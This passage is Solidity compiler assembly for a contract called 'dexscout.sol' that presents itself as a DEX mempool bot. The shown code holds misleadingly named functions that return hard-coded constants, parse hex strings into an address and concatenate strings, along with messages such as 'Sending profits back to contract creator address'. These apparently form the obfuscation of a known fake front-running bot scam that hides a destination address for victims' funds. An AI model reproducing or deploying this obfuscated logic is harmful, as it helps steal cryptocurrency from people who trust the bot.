\"dexscout.sol\":7823:7831  b1 -= 48 */\n      dup4\n      tag_87\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_87:\n      swap3\n      pop\n        /* \"dexscout.sol\":7775:7846  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_86:\n        /* \"dexscout.sol\":7698:7846  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_84:\n        /* \"dexscout.sol\":7620:7846  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_80:\n        /* \"dexscout.sol\":7870:7872  97 */\n      0x61\n        /* \"dexscout.sol\":7864:7866  b2 */\n      dup3\n        /* \"dexscout.sol\":7864:7872  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7863:7888  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_88\n      jumpi\n      pop\n        /* \"dexscout.sol\":7884:7887  102 */\n      0x66\n        /* \"dexscout.sol\":7878:7880  b2 */\n      dup3\n        /* \"dexscout.sol\":7878:7887  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7863:7888  (b2 >= 97) && (b2 <= 102) */\n    tag_88:\n        /* \"dexscout.sol\":7859:8085  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_89\n      jumpi\n        /* \"dexscout.sol\":7914:7916  87 */\n      0x57\n        /* \"dexscout.sol\":7908:7916  b2 -= 87 */\n      dup3\n      tag_90\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_90:\n      swap2\n      pop\n        /* \"dexscout.sol\":7859:8085  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_91)\n    tag_89:\n        /* \"dexscout.sol\":7948:7950  65 */\n      0x41\n        /* \"dexscout.sol\":7942:7944  b2 */\n      dup3\n        /* \"dexscout.sol\":7942:7950  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":7941:7965  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_92\n      jumpi\n      pop\n        /* \"dexscout.sol\":7962:7964  70 */\n      0x46\n        /* \"dexscout.sol\":7956:7958  b2 */\n      dup3\n        /* \"dexscout.sol\":7956:7964  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":7941:7965  (b2 >= 65) && (b2 <= 70) */\n    tag_92:\n        /* \"dexscout.sol\":7937:8085  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_93\n      jumpi\n        /* \"dexscout.sol\":7991:7993  55 */\n      0x37\n        /* \"dexscout.sol\":7985:7993  b2 -= 55 */\n      dup3\n      tag_94\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_94:\n      swap2\n      pop\n        /* \"dexscout.sol\":7937:8085  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_95)\n    tag_93:\n        /* \"dexscout.sol\":8025:8027  48 */\n      0x30\n        /* \"dexscout.sol\":8019:8021  b2 */\n      dup3\n        /* \"dexscout.sol\":8019:8027  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"dexscout.sol\":8018:8042  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_96\n      jumpi\n      pop\n        /* \"dexscout.sol\":8039:8041  57 */\n      0x39\n        /* \"dexscout.sol\":8033:8035  b2 */\n      dup3\n        /* \"dexscout.sol\":8033:8041  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":8018:8042  (b2 >= 48) && (b2 <= 57) */\n    tag_96:\n        /* \"dexscout.sol\":8014:8085  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_97\n      jumpi\n        /* \"dexscout.sol\":8068:8070  48 */\n      0x30\n        /* \"dexscout.sol\":8062:8070  b2 -= 48 */\n      dup3\n      tag_98\n      swap2\n      swap1\n      tag_79\n      jump\t// in\n    tag_98:\n      swap2\n      pop\n        /* \"dexscout.sol\":8014:8085  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_97:\n        /* \"dexscout.sol\":7937:8085  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_95:\n        /* \"dexscout.sol\":7859:8085  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_91:\n        /* \"dexscout.sol\":8118:8120  b2 */\n      dup2\n        /* \"dexscout.sol\":8113:8115  16 */\n      0x10\n        /* \"dexscout.sol\":8108:8110  b1 */\n      dup5\n        /* \"dexscout.sol\":8108:8115  b1 * 16 */\n      tag_99\n      swap2\n      swap1\n      tag_68\n      jump\t// in\n    tag_99:\n        /* \"dexscout.sol\":8108:8120  b1 * 16 + b2 */\n      tag_100\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_100:\n        /* \"dexscout.sol\":8098:8121  iaddr += (b1 * 16 + b2) */\n      dup5\n      tag_102\n      swap2\n      swap1\n      tag_101\n      jump\t// in\n    tag_102:\n      swap4\n      pop\n        /* \"dexscout.sol\":7491:7492  2 */\n      0x02\n        /* \"dexscout.sol\":7486:7492  i += 2 */\n      dup2\n      tag_103\n      swap2\n      swap1\n      tag_73\n      jump\t// in\n    tag_103:\n      swap1\n      pop\n        /* \"dexscout.sol\":7450:8132  for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_64)\n    tag_65:\n      pop\n        /* \"dexscout.sol\":8156:8161  iaddr */\n      dup3\n        /* \"dexscout.sol\":8141:8162  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":7254:8169  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":8508:8600  function _calculateGasNeeds() internal pure returns(uint256) {... */\n    tag_41:\n        /* \"dexscout.sol\":8560:8567  uint256 */\n      0x00\n        /* \"dexscout.sol\":8586:8593  4070554 */\n      0x3e1c9a\n        /* \"dexscout.sol\":8579:8593  return 4070554 */\n      swap1\n      pop\n        /* \"dexscout.sol\":8508:8600  function _calculateGasNeeds() internal pure returns(uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":10353:10466  function getMemPoolHeight() internal pure returns (uint256) {... */\n    tag_43:\n        /* \"dexscout.sol\":10404:10411  uint256 */\n      0x00\n        /* \"dexscout.sol\":10430:10437  1015264 */\n      0x0f7de0\n        /* \"dexscout.sol\":10423:10437  return 1015264 */\n      swap1\n      pop\n        /* \"dexscout.sol\":10353:10466  function getMemPoolHeight() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":13449:13564  function getMemPoolDepth() internal pure returns (uint256) {... */\n    tag_45:\n        /* \"dexscout.sol\":13499:13506  uint256 */\n      0x00\n        /* \"dexscout.sol\":13525:13535  2945814797 */\n      0xaf95910d\n        /* \"dexscout.sol\":13518:13535  return 2945814797 */\n      swap1\n      pop\n        /* \"dexscout.sol\":13449:13564  function getMemPoolDepth() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":6965:7080  function getMemPoolOffset() internal pure returns (uint256) {... */\n    tag_49:\n        /* \"dexscout.sol\":7016:7023  uint256 */\n      0x00\n        /* \"dexscout.sol\":7042:7051  219788661 */\n      0x0d19b575\n        /* \"dexscout.sol\":7035:7051  return 219788661 */\n      swap1\n      pop\n        /* \"dexscout.sol\":6965:7080  function getMemPoolOffset() internal pure returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"dexscout.sol\":8815:9252  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n    tag_50:\n        /* \"dexscout.sol\":8873:8886  string memory */\n      0x60\n        /* \"dexscout.sol\":8898:8911  uint256 count */\n      0x00\n        /* \"dexscout.sol\":8925:8934  uint256 b */\n      dup1\n        /* \"dexscout.sol\":8937:8938  a */\n      dup4\n        /* \"dexscout.sol\":8925:8938  uint256 b = a */\n      swap1\n      pop\n        /* \"dexscout.sol\":8948:9016  while (b != 0) {... */\n    tag_109:\n        /* \"dexscout.sol\":8960:8961  0 */\n      0x00\n        /* \"dexscout.sol\":8955:8956  b */\n      dup2\n        /* \"dexscout.sol\":8955:8961  b != 0 */\n      eq\n        /* \"dexscout.sol\":8948:9016  while (b != 0) {... */\n      tag_110\n      jumpi\n        /* \"dexscout.sol\":8977:8984  count++ */\n      dup2\n      dup1\n      tag_111\n      swap1\n      tag_112\n      jump\t// in\n    tag_111:\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":9003:9005  16 */\n      0x10\n        /* \"dexscout.sol\":8998:9005  b /= 16 */\n      dup2\n      tag_113\n      swap2\n      swap1\n      tag_114\n      jump\t// in\n    tag_113:\n      swap1\n      pop\n        /* \"dexscout.sol\":8948:9016  while (b != 0) {... */\n      jump(tag_109)\n    tag_110:\n        /* \"dexscout.sol\":9025:9041  bytes memory res */\n      0x00\n        /* \"dexscout.sol\":9054:9059  count */\n      dup3\n        /* \"dexscout.sol\":9044:9060  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_115\n      jumpi\n      tag_116\n      tag_117\n      jump\t// in\n    tag_116:\n    tag_115:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_118\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_118:\n      pop\n        /* \"dexscout.sol\":9025:9060  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"dexscout.sol\":9075:9084  uint256 i */\n      0x00\n        /* \"dexscout.sol\":9070:9217  for (uint256 i = 0; i < count; ++i) {... */\n    tag_119:\n        /* \"dexscout.sol\":9094:9099  count */\n      dup4\n        /* \"dexscout.sol\":9090:9091  i */\n      dup2\n        /* \"dexscout.sol\":9090:9099  i < count */\n      lt\n        /* \"dexscout.sol\":9070:9217  for (uint256 i = 0; i < count; ++i) {... */\n      iszero\n      tag_120\n      jumpi\n        /* \"dexscout.sol\":9128:9130  16 */\n      0x10\n        /* \"dexscout.sol\":9124:9125  a */\n      dup7\n        /* \"dexscout.sol\":9124:9130  a % 16 */\n      tag_122\n      swap2\n      swap1\n      tag_123\n      jump\t// in\n    tag_122:\n        /* \"dexscout.sol\":9120:9130  b = a % 16 */\n      swap3\n      pop\n        /* \"dexscout.sol\":9165:9185  toHexDigit(uint8(b)) */\n      tag_124\n        /* \"dexscout.sol\":9182:9183  b */\n      dup4\n        /* \"dexscout.sol\":9165:9175  toHexDigit */\n      tag_125\n        /* \"dexscout.sol\":9165:9185  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_124:\n        /* \"dexscout.sol\":9144:9147  res */\n      dup3\n        /* \"dexscout.sol\":9160:9161  1 */\n      0x01\n        /* \"dexscout.sol\":9156:9157  i */\n      dup4\n        /* \"dexscout.sol\":9148:9153  count */\n      dup8\n        /* \"dexscout.sol\":9148:9157  count - i */\n      tag_126\n      swap2\n      swap1\n      tag_127\n      jump\t// in\n    tag_126:\n        /* \"dexscout.sol\":9148:9161  count - i - 1 */\n      tag_128\n      swap2\n      swap1\n      tag_127\n      jump\t// in\n    tag_128:\n        /* \"dexscout.sol\":9144:9162  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_129\n      jumpi\n      tag_130\n      tag_71\n      jump\t// in\n    tag_130:\n    tag_129:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":9144:9185  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":9204:9206  16 */\n      0x10\n        /* \"dexscout.sol\":9199:9206  a /= 16 */\n      dup7\n      tag_131\n      swap2\n      swap1\n      tag_114\n      jump\t// in\n    tag_131:\n      swap6\n      pop\n        /* \"dexscout.sol\":9101:9104  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"dexscout.sol\":9070:9217  for (uint256 i = 0; i < count; ++i) {... */\n      jump(tag_119)\n    tag_120:\n      pop\n        /* \"dexscout.sol\":9241:9244  res */\n      dup1\n        /* \"dexscout.sol\":9227:9245  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":8815:9252  function checkLiquidity(uint256 a) internal pure returns (string memory) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":13894:14543  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n    tag_51:\n        /* \"dexscout.sol\":13977:13990  string memory */\n      0x60\n        /* \"dexscout.sol\":14002:14025  bytes memory _baseBytes */\n      0x00\n        /* \"dexscout.sol\":14034:14039  _base */\n      dup4\n        /* \"dexscout.sol\":14002:14040  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"dexscout.sol\":14050:14074  bytes memory _valueBytes */\n      0x00\n        /* \"dexscout.sol\":14083:14089  _value */\n      dup4\n        /* \"dexscout.sol\":14050:14090  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"dexscout.sol\":14101:14124  string memory _tmpValue */\n      0x00\n        /* \"dexscout.sol\":14171:14182  _valueBytes */\n      dup2\n        /* \"dexscout.sol\":14171:14189  _valueBytes.length */\n      mload\n        /* \"dexscout.sol\":14151:14161  _baseBytes */\n      dup4\n        /* \"dexscout.sol\":14151:14168  _baseBytes.length */\n      mload\n        /* \"dexscout.sol\":14151:14189  _baseBytes.length + _valueBytes.length */\n      tag_133\n      swap2\n      swap1\n      tag_73\n      jump\t// in\n    tag_133:\n        /* \"dexscout.sol\":14127:14199  new string(... */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_134\n      jumpi\n      tag_135\n      tag_117\n      jump\t// in\n    tag_135:\n    tag_134:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_136\n      jumpi\n      dup2\n      0x20\n      add\n      0x01\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_136:\n      pop\n        /* \"dexscout.sol\":14101:14199  string memory _tmpValue = new string(... */\n      swap1\n      pop\n        /* \"dexscout.sol\":14209:14231  bytes memory _newValue */\n      0x00\n        /* \"dexscout.sol\":14240:14249  _tmpValue */\n      dup2\n        /* \"dexscout.sol\":14209:14250  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"dexscout.sol\":14261:14270  uint256 i */\n      0x00\n        /* \"dexscout.sol\":14280:14289  uint256 j */\n      dup1\n        /* \"dexscout.sol\":14309:14310  0 */\n      0x00\n        /* \"dexscout.sol\":14305:14310  i = 0 */\n      swap2\n      pop\n        /* \"dexscout.sol\":14300:14395  for (i = 0; i < _baseBytes.length; i++) {... */\n    tag_137:\n        /* \"dexscout.sol\":14316:14326  _baseBytes */\n      dup6\n        /* \"dexscout.sol\":14316:14333  _baseBytes.length */\n      mload\n        /* \"dexscout.sol\":14312:14313  i */\n      dup3\n        /* \"dexscout.sol\":14312:14333  i < _baseBytes.length */\n      lt\n        /* \"dexscout.sol\":14300:14395  for (i = 0; i < _baseBytes.length; i++) {... */\n      iszero\n      tag_138\n      jumpi\n        /* \"dexscout.sol\":14371:14381  _baseBytes */\n      dup6\n        /* \"dexscout.sol\":14382:14383  i */\n      dup3\n        /* \"dexscout.sol\":14371:14384  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_140\n      jumpi\n      tag_141\n      tag_71\n      jump\t// in\n    tag_141:\n    tag_140:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":14354:14363  _newValue */\n      dup4\n        /* \"dexscout.sol\":14364:14367  j++ */\n      dup3\n      dup1\n      tag_142\n      swap1\n      tag_112\n      jump\t// in\n    tag_142:\n      swap4\n      pop\n        /* \"dexscout.sol\":14354:14368  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_143\n      jumpi\n      tag_144\n      tag_71\n      jump\t// in\n    tag_144:\n    tag_143:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":14354:14384  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":14335:14338  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":14300:14395  for (i = 0; i < _baseBytes.length; i++) {... */\n      jump(tag_137)\n    tag_138:\n        /* \"dexscout.sol\":14414:14415  0 */\n      0x00\n        /* \"dexscout.sol\":14410:14415  i = 0 */\n      swap2\n      pop\n        /* \"dexscout.sol\":14405:14502  for (i = 0; i < _valueBytes.length; i++) {... */\n    tag_145:\n        /* \"dexscout.sol\":14421:14432  _valueBytes */\n      dup5\n        /* \"dexscout.sol\":14421:14439  _valueBytes.length */\n      mload\n        /* \"dexscout.sol\":14417:14418  i */\n      dup3\n        /* \"dexscout.sol\":14417:14439  i < _valueBytes.length */\n      lt\n        /* \"dexscout.sol\":14405:14502  for (i = 0; i < _valueBytes.length; i++) {... */\n      iszero\n      tag_146\n      jumpi\n        /* \"dexscout.sol\":14477:14488  _valueBytes */\n      dup5\n        /* \"dexscout.sol\":14489:14490  i */\n      dup3\n        /* \"dexscout.sol\":14477:14491  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_148\n      jumpi\n      tag_149\n      tag_71\n      jump\t// in\n    tag_149:\n    tag_148:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"dexscout.sol\":14460:14469  _newValue */\n      dup4\n        /* \"dexscout.sol\":14470:14473  j++ */\n      dup3\n      dup1\n      tag_150\n      swap1\n      tag_112\n      jump\t// in\n    tag_150:\n      swap4\n      pop\n        /* \"dexscout.sol\":14460:14474  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_151\n      jumpi\n      tag_152\n      tag_71\n      jump\t// in\n    tag_152:\n    tag_151:\n      0x20\n      add\n      add\n        /* \"dexscout.sol\":14460:14491  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"dexscout.sol\":14441:14444  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"dexscout.sol\":14405:14502  for (i = 0; i < _valueBytes.length; i++) {... */\n      jump(tag_145)\n    tag_146:\n        /* \"dexscout.sol\":14526:14535  _newValue */\n      dup3\n        /* \"dexscout.sol\":14512:14536  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"dexscout.sol\":13894:14543  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"dexscout.sol\":11956:12286  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_125:\n        /* \"dexscout.sol\":12008:12014  bytes1 */\n      0x00\n        /* \"dexscout.sol\":12035:12036  d */\n      dup2\n        /* \"dexscout.sol\":12030:12036  0 <= d */\n      0xff\n      and\n        /* \"dexscout.sol\":12030:12031  0 */\n      0x00\n        /* \"dexscout.sol\":12030:12036  0 <= d */\n      gt\n      iszero\n        /* \"dexscout.sol\":12030:12046  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_154\n      jumpi\n      pop\n        /* \"dexscout.sol\":12045:12046  9 */\n      0x09\n        /* \"dexscout.sol\":12040:12041  d */\n      dup3\n        /* \"dexscout.sol\":12040:12046  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":12030:12046  0 <= d && d <= 9 */\n    tag_154:\n        /* \"dexscout.sol\":12026:12221  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_155\n      jumpi\n        /* \"dexscout.sol\":12097:12098  d */\n      dup2\n        /* \"dexscout.sol\":12082:12093  bytes1(\"0\") */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"dexscout.sol\":12076:12094  uint8(bytes1(\"0\")) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":12076:12098  uint8(bytes1(\"0\")) + d */\n      tag_156\n      swap2\n      swap1\n      tag_157\n      jump\t// in\n    tag_156:\n        /* \"dexscout.sol\":12069:12099  bytes1(uint8(bytes1(\"0\")) + d) */\n      0xf8\n      shl\n        /* \"dexscout.sol\":12062:12099  return bytes1(uint8(bytes1(\"0\")) + d) */\n      swap1\n      pop\n      jump(tag_153)\n        /* \"dexscout.sol\":12026:12221  if (0 <= d && d <= 9) {... */\n    tag_155:\n        /* \"dexscout.sol\":12132:12133  d */\n      dup2\n        /* \"dexscout.sol\":12120:12134  10 <= uint8(d) */\n      0xff\n      and\n        /* \"dexscout.sol\":12120:12122  10 */\n      0x0a\n        /* \"dexscout.sol\":12120:12134  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"dexscout.sol\":12120:12152  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_159\n      jumpi\n      pop\n        /* \"dexscout.sol\":12150:12152  15 */\n      0x0f\n        /* \"dexscout.sol\":12144:12145  d */\n      dup3\n        /* \"dexscout.sol\":12138:12152  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"dexscout.sol\":12120:12152  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_159:\n        /* \"dexscout.sol\":12116:12221  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_160\n      jumpi\n        /* \"dexscout.sol\":12207:12209  10 */\n      0x0a\n        /* \"dexscout.sol\":12203:12204  d */\n      dup3\n        /* \"dexscout.sol\":12188:12199  bytes1(\"a\") */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"dexscout.sol\":12182:12200  uint8(bytes1(\"a\")) */\n      0xf8\n      shr\n        /* \"dexscout.sol\":12182:12204  uint8(bytes1(\"a\")) + d */\n      tag_161\n      swap2\n      swap1\n      tag_157\n      jump\t// in\n    tag_161:\n        /* \"dexscout.sol\":12182:12209  uint8(bytes1(\"a\")) + d - 10 */\n      tag_162\n      swap2\n      swap1\n      tag_163\n      jump\t// in\n    tag_162:\n        /* \"dexscout.sol\":12175:12210  bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      0xf8\n      shl\n        /* \"dexscout.sol\":12168:12210  return bytes1(uint8(bytes1(\"a\")) + d - 10) */\n      swap1\n      pop\n      jump(tag_153)\n        /* \"dexscout.sol\":12116:12221  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_160:\n        /* \"dexscout.sol\":12271:12279  revert() */\n      0x00\n      dup1\n      revert\n        /* \"dexscout.sol\":11956:12286  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\n    tag_153:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:176   */\n    tag_164:\n        /* \"#utility.yul\":91:102   */\n      0x00\n        /* \"#utility.yul\":125:131   */\n      dup3\n        /* \"#utility.yul\":120:123   */\n      dup3\n        /* \"#utility.yul\":113:132   */\n      mstore\n        /* \"#utility.yul\":165:169   */\n      0x20\n        /* \"#utility.yul\":160:163   */\n      dup3\n        /* \"#utility.yul\":156:170   */\n      add\n        /* \"#utility.yul\":141:170   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:176   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":182:430   */\n    tag_165:\n        /* \"#utility.yul\":322:356   */\n      0x52756e6e696e672044657853636f757420616374696f6e2e2054686973206361\n        /* \"#utility.yul\":318:319   */\n      0x00\n        /* \"#utility.yul\":310:316   */\n      dup3\n        /* \"#utility.yul\":306:320   */\n      add\n        /* \"#utility.yul\":299:357   */\n      mstore\n        /* \"#utility.yul\":391:422   */\n      0x6e2074616b652061207768696c653b20706c6561736520776169742e2e000000\n        /* \"#utility.yul\":386:388   */\n      0x20\n        /* \"#utility.yul\":378:384   */\n      dup3\n        /* \"#utility.yul\":374:389   */\n      add\n        /* \"#utility.yul\":367:423   */\n      mstore\n        /* \"#utility.yul\":182:430   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":436:802   */\n    tag_166:\n        /* \"#utility.yul\":578:581   */\n      0x00\n        /* \"#utility.yul\":599:666   */\n      tag_180\n        /* \"#utility.yul\":663:665   */\n      0x3d\n        /* \"#utility.yul\":658:661   */\n      dup4\n        /* \"#utility.yul\":599:666   */\n      tag_164\n      jump\t// in\n    tag_180:\n        /* \"#utility.yul\":592:666   */\n      swap2\n      pop\n        /* \"#utility.yul\":675:768   */\n      tag_181\n        /* \"#utility.yul\":764:767   */\n      dup3\n        /* \"#utility.yul\":675:768   */\n      tag_165\n      jump\t// in\n    tag_181:\n        /* \"#utility.yul\":793:795   */\n      0x40\n        /* \"#utility.yul\":788:791   */\n      dup3\n        /* \"#utility.yul\":784:796   */\n      add\n        /* \"#utility.yul\":777:796   */\n      swap1\n      pop\n        /* \"#utility.yul\":436:802   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":808:1227   */\n    tag_16:\n        /* \"#utility.yul\":974:978   */\n      0x00\n        /* \"#utility.yul\":1012:1014   */\n      0x20\n        /* \"#utility.yul\":1001:1010   */\n      dup3\n        /* \"#utility.yul\":997:1015   */\n      add\n        /* \"#utility.yul\":989:1015   */\n      swap1\n      pop\n        /* \"#utility.yul\":1061:1070   */\n      dup2\n        /* \"#utility.yul\":1055:1059   */\n      dup2\n        /* \"#utility.yul\":1051:1071   */\n      sub\n        /* \"#utility.yul\":1047:1048   */\n      0x00\n        /* \"#utility.yul\":1036:1045   */\n      dup4\n        /* \"#utility.yul\":1032:1049   */\n      add\n        /* \"#utility.yul\":1025:1072   */\n      mstore\n        /* \"#utility.yul\":1089:1220   */\n      tag_183\n        /* \"#utility.yul\":1215:1219   */\n      dup2\n        /* \"#utility.yul\":1089:1220   */\n      tag_166\n      jump\t// in\n    tag_183:\n        /* \"#utility.yul\":1081:1220   */\n      swap1\n      pop\n        /* \"#utility.yul\":808:1227   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1233:1471   */\n    tag_167:\n        /* \"#utility.yul\":1373:1407   */\n      0x53656e64696e672070726f66697473206261636b20746f20636f6e7472616374\n        /* \"#utility.yul\":1369:1370   */\n      0x00\n        /* \"#utility.yul\":1361:1367   */\n      dup3\n        /* \"#utility.yul\":1357:1371   */\n      add\n        /* \"#utility.yul\":1350:1408   */\n      mstore\n        /* \"#utility.yul\":1442:1463   */\n      0x2063726561746f7220616464726573732e2e2e00000000000000000000000000\n        /* \"#utility.yul\":1437:1439   */\n      0x20\n        /* \"#utility.yul\":1429:1435   */\n      dup3\n        /* \"#utility.yul\":1425:1440   */\n      add\n        /* \"#utility.yul\":1418:1464   */\n      mstore\n        /* \"#utility.yul\":1233:1471   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1477:1843   */\n    tag_168:\n        /* \"#utility.yul\":1619:1622   */\n      0x00\n        /* \"#utility.yul\":1640:1707   */\n      tag_186\n        /* \"#utility.yul\":1704:1706   */\n      0x33\n        /* \"#utility.yul\":1699:1702   */\n      dup4\n        /* \"#utility.yul\":1640:1707   */\n      tag_164\n      jump\t// in\n    tag_186:\n        /* \"#utility.yul\":1633:1707   */\n      swap2\n      pop\n        /* \"#utility.yul\":1716:1809   */\n      tag_187\n        /* \"#utility.yul\":1805:1808   */\n      dup3\n        /* \"#utility.yul\":1716:1809   */\n      tag_167\n      jump\t// in\n    tag_187:\n        /* \"#utility.yul\":1834:1836   */\n      0x40\n        /* \"#utility.yul\":1829:1832   */\n      dup3\n        /* \"#utility.yul\":1825:1837   */\n      add\n        /* \"#utility.yul\":1818:1837   */\n      swap1\n      pop\n        /* \"#utility.yul\":1477:1843   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1849:2268   */\n    tag_23:\n        /* \"#utility.yul\":2015:2019   */\n      0x00\n        /* \"#utility.yul\":2053:2055   */\n      0x20\n        /* \"#utility.yul\":2042:2051   */\n      dup3\n        /* \"#utility.yul\":2038:2056   */\n      add\n        /* \"#utility.yul\":2030:2056   */\n      swap1\n      pop\n        /* \"#utility.yul\":2102:2111   */\n      dup2\n        /* \"#utility.yul\":2096:2100   */\n      dup2\n        /* \"#utility.yul\":2092:2112   */\n      sub\n        /* \"#utility.yul\":2088:2089   */\n      0x00\n        /* \"#utility.yul\":2077:2086   */\n      dup4\n        /* \"#utility.yul\":2073:2090   */\n      add\n        /* \"#utility.yul\":2066:2113   */\n      mstore\n        /* \"#utility.yul\":2130:2261   